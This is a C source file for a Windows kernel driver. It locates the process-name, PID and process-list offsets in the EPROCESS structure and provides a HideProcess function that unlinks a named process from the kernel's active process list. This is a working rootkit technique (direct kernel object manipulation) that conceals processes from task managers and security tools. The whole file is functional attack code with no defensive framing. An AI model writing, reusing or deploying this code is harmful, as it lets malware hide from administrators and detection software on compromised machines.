/********************************************************************************
*																				*
* File Name:																	*
* 	misc.c	    																*
*																				*
* Abstract:																		*
* 	This file contains miscellaneous function definitions.      				*
*																				*
* Revision History:																*
* 	Date:	02 August 2025														*
* 	Author: Arpit Mathur														*
* 	Desc:	Created																*
*																				*
********************************************************************************/


/////////////////////////////////////////////////////////////////////
//	H E A D E R S.
/////////////////////////////////////////////////////////////////////
#include "precomp.h"


/////////////////////////////////////////////////////////////////////
//	P R A G M A S.
/////////////////////////////////////////////////////////////////////

//
//	These are compiler directive which specifies 
//  whether the code of the function can be paged out of memory or not.
// 
#pragma alloc_text(PAGE, InitializeOffsets)
#pragma alloc_text(PAGE, CalcProcessNameOffset)
#pragma alloc_text(PAGE, CalcPIDOffset)
#pragma alloc_text(PAGE, HideProcess)


/////////////////////////////////////////////////////////////////////
//	F U N C T I O N  D E F I N I T I O N S.
/////////////////////////////////////////////////////////////////////

//***********************************************************************************
// 
//	Function:
//		InitializeOffsets.
//
//	Parameters:
//		None.
//
//	Routine Description:
//		Initializes necessary offsets in the EPROCESS structure.
//
//	Return Value:
//		BOOLEAN.
//      TRUE if process name or process id offsets are found.
//      Otherwise FALSE.
//
//***********************************************************************************
BOOLEAN 
InitializeOffsets()
{
    #ifdef DBG_ALL_INITIALIZEOFFSETS
    DbgPrint("InitializeOffsets: Entry\r\n");
    #endif

    //
    //  Initialize process name offset in the EPROCESS structure.
    //
    ulNameOffset = CalcProcessNameOffset();

    //
    //  Initialize process id offset in the EPROCESS structure.
    //
    ulPidOffset = CalcPIDOffset();

    //
    //  Initialize list entry offset in the EPROCESS structure.
    //
    ulListEntryOffset = ulPidOffset + sizeof(HANDLE); // By adding sizeof(HANDLE) to PID offset, we calculate where the LIST_ENTRY starts.

    //
    //  Did we got process name and process id offsets?
    //
    if (ulPidOffset == 0 || ulNameOffset == 0)
    {
        return FALSE;
    }

    #ifdef DBG_ALL_INITIALIZEOFFSETS
    DbgPrint("InitializeOffsets: NameOffset Address: 0x%X\r\n", ulNameOffset);
    DbgPrint("InitializeOffsets: PID Address: 0x%X\r\n", ulPidOffset);
    DbgPrint("InitializeOffsets: ListEntry Address: 0x%X\r\n", ulListEntryOffset);

    DbgPrint("InitializeOffsets: Exit\r\n");
    #endif

    return TRUE;
}


//***********************************************************************************
// 
//	Function:
//		CalcProcessNameOffset.
//
//	Parameters:
//		None.
//
//	Routine Description:
//		Set process name offset by finding offset of the process name in the 
//      EPROCESS structure.
//
//	Return Value:
//		ULONG.
//      0 if process name offset is not found.
//      Otherwise non 0.
//
//***********************************************************************************
ULONG 
CalcProcessNameOffset()
{
    #ifdef DBG_ALL_CALCPROCESSNAMEOFFSET
    DbgPrint("CalcProcessNameOffset: Entry\r\n");
    #endif

    //
    //  Get pointer to system process's EPROCESS structure.
    //
    PEPROCESS pEProcessNtOsKrnl = PsInitialSystemProcess;
    int i;

    for (i = 0; i < PAGE_SIZE; i++)
    {
        //
        //  Does next 6 bytes matches the string "System".
        //
        if (RtlCompareMemory((PCHAR)pEProcessNtOsKrnl + i, "System", 6) == 6)
        {
            return i; // Returns the offset of the process name in EPROCESS structure.
        }
    }

    #ifdef DBG_ALL_CALCPROCESSNAMEOFFSET
    DbgPrint("CalcProcessNameOffset: Exit\r\n");
    #endif

    return 0; // Returns 0 if the process name offset was not found in EPROCESS structure.
}


//***********************************************************************************
// 
//	Function:
//		CalcPIDOffset.
//
//	Parameters:
//		None.
//
//	Routine Description:
//		Set process id offset in the EPROCESS structure.
//
//	Return Value:
//		ULONG.
//      0 if process id offset is not found.
//      Otherwise non 0.
//
//***********************************************************************************
ULONG 
CalcPIDOffset()
{
    //
    //  Get the pointer to current process's EPROCESS structure.
    //
    PEPROCESS pEProcesss = IoGetCurrentProcess();

    //
    //  Get process id of current process.
    //
    HANDLE hPid = PsGetCurrentProcessId();

    //
    //  To confirm the its a process list.
    PLIST_ENTRY pProcessListEntry = NULL;
    int i;

    #ifdef DBG_ALL_CALCPIDOFFSET
    DbgPrint("CalcPIDOffset: Entry\r\n");
    #endif

    for (i = 0; i < PAGE_SIZE; i += sizeof(HANDLE))
    {
        //
        //  Does current byte matches with current process id?
        //
        if (*(PHANDLE)((PCHAR)pEProcesss + i) == hPid)
        {
            //
            //  Next process list entry
            //
            pProcessListEntry = (PLIST_ENTRY)((unsigned char*)pEProcesss + i + sizeof(HANDLE));

            //
            //  Does process list entry has a valid address?
            //
            if (MmIsAddressValid(pProcessListEntry))
            {
                //
                //  Are list pointers consistent?
                //
                if (pProcessListEntry == pProcessListEntry->Flink->Blink)
                {
                    return i; // Returns found offset of process id in EPROCESS structure.
                }
            }
        }
    }

    #ifdef DBG_ALL_CALCPIDOFFSET
    DbgPrint("CalcPIDOffset: Exit\r\n");
    #endif

    return 0; // Returns 0 if the process id offset in EPROCESS structure was not found.
}


//***********************************************************************************
// 
//	Function:
//		HideProcess.
//
//	Parameters:
//		[IN]  char* target
//      Name of the process to hide.
//
//	Routine Description:
//		Hides the specified process by unlinking it from the active process list 
//      in the EPROCESS structure.
//
//	Return Value:
//		VOID.
//
//***********************************************************************************
VOID 
HideProcess(
    IN  char* target
)
{
    PLIST_ENTRY pHead, pCurrentNode, pPrevNode;
    PEPROCESS pEProcessStart;
    unsigned char* pbyCurrentProcess = NULL;
    ANSI_STRING ansiTargetProcessName, ansiCurrentProcessName;

    #ifdef DBG_ALL_HIDEPROCESS
    DbgPrint("HideProcess: Entry\r\n");
    #endif

    //
    //  Get EPROCESS pointer for the current process.
    //
    pEProcessStart = IoGetCurrentProcess();

    //
    //  Initialize current node and head to point to the process list entry within the EPROCES structure
    //
    pHead = pCurrentNode = (PLIST_ENTRY)((unsigned char*)pEProcessStart + ulListEntryOffset);

    //
    //  Initialize target process name.
    //
    RtlInitAnsiString(&ansiTargetProcessName, target);

    do
    {
        //
        //  Initialize current process name.
        //
        pbyCurrentProcess = (unsigned char*)((unsigned char*)pCurrentNode - ulListEntryOffset);
        RtlInitAnsiString(&ansiCurrentProcessName, (const char*)((unsigned char*)pbyCurrentProcess + ulNameOffset));

        //
        //  Target process name == Current process name?
        //
        if (RtlCompareString(&ansiTargetProcessName, &ansiCurrentProcessName, TRUE) == 0)
        {
            #ifdef DBG_ALL_HIDEPROCESS
            DbgPrint("HideProcess: Found target process %s.\r\n", target);
            #endif

            //
            //  Update previous node of the process list.
            //
            pPrevNode = pCurrentNode->Blink;
            pPrevNode->Flink = pCurrentNode->Flink;

            //
            //  Update next node of the process list.
            //
            pCurrentNode->Flink->Blink = pPrevNode;

            //
            //  Update current node of the process list to point to itself
            //
            pCurrentNode->Flink = pCurrentNode;
            pCurrentNode->Blink = pCurrentNode;
            break;
        }

        //
        //  Move to the next node in the process list.
        //
        pCurrentNode = pCurrentNode->Flink;

    } while (pCurrentNode != pHead); // Have we traversed the whole process list?

    #ifdef DBG_ALL_HIDEPROCESS
    DbgPrint("HideProcess: Exit\r\n");
    #endif
}